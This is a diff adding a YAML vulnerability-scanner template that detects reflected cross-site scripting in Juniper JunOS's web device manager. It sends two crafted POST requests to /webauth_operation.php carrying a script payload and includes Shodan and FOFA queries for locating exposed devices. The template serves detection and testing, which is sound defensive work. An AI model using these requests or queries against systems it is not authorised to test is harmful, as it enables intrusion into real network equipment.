@@ -1,0 +1,55 @@
+id: junos-xss
+
+info:
+  name: JunOS - Cross-Site Scripting
+  author: DhiyaneshDK
+  severity: medium
+  reference:
+    - https://labs.watchtowr.com/the-second-wednesday-of-the-first-month-of-every-quarter-juniper-0day-revisited/
+  classification:
+    cpe: cpe:2.3:o:juniper:junos:*:*:*:*:*:*:*:*
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: juniper
+    product: junos
+    shodan-query: title:"Juniper Web Device Manager"
+    fofa-query: title="Juniper Web Device Manager"
+  tags: junos,xss,vuln
+variables:
+  string: "{{to_lower(rand_base(2))}}"
+
+http:
+  - raw:
+      - |
+        POST /webauth_operation.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        rs=emit_debug_note&rsargs[]={{string}}&rsargs[]=<script>alert('document.domain');</script>
+      - |
+        POST /webauth_operation.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        rs=sajax_show_one_stub&rsargs[]={{string}}<script>alert('document.domain');</script>
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: emit-debug-note-xss
+        words:
+          - "ERROR: <script>alert('document.domain');</script>"
+          - "monospace"
+        condition: and
+
+      - type: word
+        name: sajax-show-one-stub-xss
+        words:
+          - "<script>alert('document.domain');</script>"
+          - "wrapper for"
+        condition: and
+# digest: 4a0a00473045022062810fe4d7eea6ff01cdf85fe95ae10ed5eeb1a01417c6b817184ea83a09cb3c0221008fcd21d3e4328f7d73ef592e099018ec3b8a2693fae4a5c74862d10087b3e499:922c64590222798bb761d5b6d8e72950
